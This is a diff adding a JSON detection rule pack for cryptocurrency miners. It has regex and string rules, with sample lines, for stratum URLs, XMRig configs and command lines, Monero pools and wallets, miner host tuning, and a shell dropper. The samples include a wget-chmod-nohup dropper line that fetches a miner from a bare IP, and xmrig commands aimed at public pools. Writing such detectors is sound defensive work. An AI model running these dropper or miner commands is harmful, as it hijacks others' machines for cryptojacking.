@@ -1,0 +1,461 @@
+{
+ "pack": "miners",
+ "rules": [
+  {
+   "id": "byte-miner-stratum-url",
+   "name": "Stratum mining-pool URL with credentials",
+   "description": "A stratum+tcp/ssl URL: the mining-pool protocol used by miners. Strong on its own in non-mining software.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "s",
+     "type": "regex",
+     "value": "stratum\\+(?:tcp|ssl|tls)://[A-Za-z0-9.\\-]{3,80}:\\d{2,5}"
+    }
+   ],
+   "condition": {
+    "str": "s"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "pool url: stratum+tcp://pool.example.org:3333"
+     }
+    ],
+    "negative": [
+     {
+      "text": "stratum layer of the rock"
+     },
+     {
+      "text": "stratum+http"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-xmrig-config",
+   "name": "XMRig-style JSON configuration",
+   "description": "A miner configuration with pools, donate-level and algo/randomx keys.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "d",
+     "type": "ascii",
+     "value": "\"donate-level\""
+    },
+    {
+     "name": "p",
+     "type": "ascii",
+     "value": "\"pools\""
+    },
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "\"algo\""
+    },
+    {
+     "name": "r",
+     "type": "ascii",
+     "value": "\"rx\""
+    },
+    {
+     "name": "u",
+     "type": "ascii",
+     "value": "\"url\""
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "d"
+     },
+     {
+      "str": "p"
+     },
+     {
+      "any": [
+       {
+        "str": "a"
+       },
+       {
+        "str": "r"
+       },
+       {
+        "str": "u"
+       }
+      ]
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "{\"donate-level\":0,\"pools\":[{\"algo\":\"rx/0\",\"url\":\"pool:443\"}]}"
+     }
+    ],
+    "negative": [
+     {
+      "text": "{\"pools\":[{\"url\":\"x\"}]}"
+     },
+     {
+      "text": "{\"donate-level\":0}"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-xmrig-cmdline",
+   "name": "XMRig-style command line",
+   "description": "Command line using -o pool, -u wallet and --donate-level / --cpu-priority flags.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "o",
+     "type": "regex",
+     "value": "(?:^|\\s)-o\\s+\\S+:\\d{2,5}\\b"
+    },
+    {
+     "name": "u",
+     "type": "regex",
+     "value": "(?:^|\\s)-u\\s+\\S{20,}"
+    },
+    {
+     "name": "f",
+     "type": "regex",
+     "value": "--(?:donate-level|cpu-priority|rig-id|coin|tls|keepalive)\\b"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "o"
+     },
+     {
+      "str": "u"
+     },
+     {
+      "str": "f"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "./xmrig -o pool.example:3333 -u 4AbCdEfGhIjKlMnOpQrStUvWxYz --donate-level=1 -k"
+     }
+    ],
+    "negative": [
+     {
+      "text": "./tool -o out.txt -u user"
+     },
+     {
+      "text": "./xmrig --donate-level=1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-algo-names",
+   "name": "Miner algorithm markers with pool terms",
+   "description": "RandomX/CryptoNight/Ethash names near stratum or pool words in one file.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\b(?:randomx|cryptonight(?:-?r|-?v\\d|-?heavy)?|ethash|kawpow|yespower|argon2d)\\b",
+     "nocase": true
+    },
+    {
+     "name": "p",
+     "type": "regex",
+     "value": "\\bstratum\\b|\\bmining\\s*pool\\b|\\bhashrate\\b|\\bnonce\\b",
+     "nocase": true
+    },
+    {
+     "name": "m",
+     "type": "regex",
+     "value": "\\b(?:miner|mining|xmr|monero)\\b",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "p"
+     },
+     {
+      "str": "m"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "RandomX miner reports hashrate to the mining pool via stratum"
+     }
+    ],
+    "negative": [
+     {
+      "text": "RandomX is a proof-of-work algorithm."
+     },
+     {
+      "text": "mining pool hashrate"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-public-pools",
+   "name": "Public Monero pool hostnames",
+   "description": "Domains of widely used public pools, with a wallet-style parameter, in a config or script.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "h",
+     "type": "regex",
+     "value": "\\b(?:pool\\.minexmr\\.com|xmr\\.nanopool\\.org|pool\\.supportxmr\\.com|gulf\\.moneroocean\\.stream|monerohash\\.com|xmrpool\\.eu|pool\\.hashvault\\.pro|xmr-eu1\\.nanopool\\.org)\\b",
+     "nocase": true
+    },
+    {
+     "name": "k",
+     "type": "regex",
+     "value": "(?:\\\"user\\\"|-u|--user|wallet)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "h"
+     },
+     {
+      "str": "k"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "-o pool.supportxmr.com:3333 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
+     }
+    ],
+    "negative": [
+     {
+      "text": "pool.supportxmr.com is a site"
+     },
+     {
+      "text": "-u user"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-wallet-xmr",
+   "name": "Monero wallet address next to mining words",
+   "description": "A 95-character Monero address together with pool or mining words.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "medium",
+   "weight": 25,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "w",
+     "type": "regex",
+     "value": "\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b"
+    },
+    {
+     "name": "m",
+     "type": "regex",
+     "value": "\\b(?:pool|miner|mining|stratum|xmrig|hashrate)\\b",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "w"
+     },
+     {
+      "str": "m"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wallet=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A pool=x"
+     }
+    ],
+    "negative": [
+     {
+      "text": "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
+     },
+     {
+      "text": "mining pool"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-dropper-script",
+   "name": "Shell dropper that fetches, hides and starts a miner",
+   "description": "Fetches a binary, marks it executable and starts it detached, with miner naming and process-kill of competitors.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "f",
+     "type": "regex",
+     "value": "\\b(?:curl|wget)\\b[^\\n]{0,160}(?:xmrig|minerd|kdevtmpfsi|kinsing|sysupdate|\\.x86_64|xmr)",
+     "nocase": true
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": "chmod +x"
+    },
+    {
+     "name": "n",
+     "type": "regex",
+     "value": "\\bnohup\\b|\\bsetsid\\b|\\bdisown\\b"
+    },
+    {
+     "name": "k",
+     "type": "regex",
+     "value": "(?:pkill|killall|kill\\s+-9)\\s+[^\\n]{0,40}(?:xmrig|minerd|kinsing|kdevtmpfsi|cpuminer)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "f"
+     },
+     {
+      "str": "c"
+     },
+     {
+      "any": [
+       {
+        "str": "n"
+       },
+       {
+        "str": "k"
+       }
+      ]
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wget http://1.2.3.4/xmrig -O /tmp/x; chmod +x /tmp/x; nohup /tmp/x &"
+     }
+    ],
+    "negative": [
+     {
+      "text": "wget http://1.2.3.4/tool -O /tmp/x; chmod +x /tmp/x; nohup /tmp/x &"
+     },
+     {
+      "text": "pkill xmrig"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-miner-msr-hugepages",
+   "name": "Miner host tuning: MSR writes and huge pages",
+   "description": "wrmsr or /dev/cpu/*/msr together with vm.nr_hugepages: performance tuning that miners apply.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "severity": "low",
+   "weight": 12,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "m",
+     "type": "regex",
+     "value": "wrmsr\\s+(?:-a\\s+)?0x[0-9a-fA-F]+|/dev/cpu/\\d+/msr"
+    },
+    {
+     "name": "h",
+     "type": "regex",
+     "value": "vm\\.nr_hugepages\\s*=?\\s*\\d+|nr_hugepages"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "m"
+     },
+     {
+      "str": "h"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wrmsr -a 0xc0011020 0x0\nsysctl -w vm.nr_hugepages=1280"
+     }
+    ],
+    "negative": [
+     {
+      "text": "sysctl -w vm.nr_hugepages=1280"
+     },
+     {
+      "text": "wrmsr 0x1"
+     }
+    ]
+   }
+  }
+ ]
+}
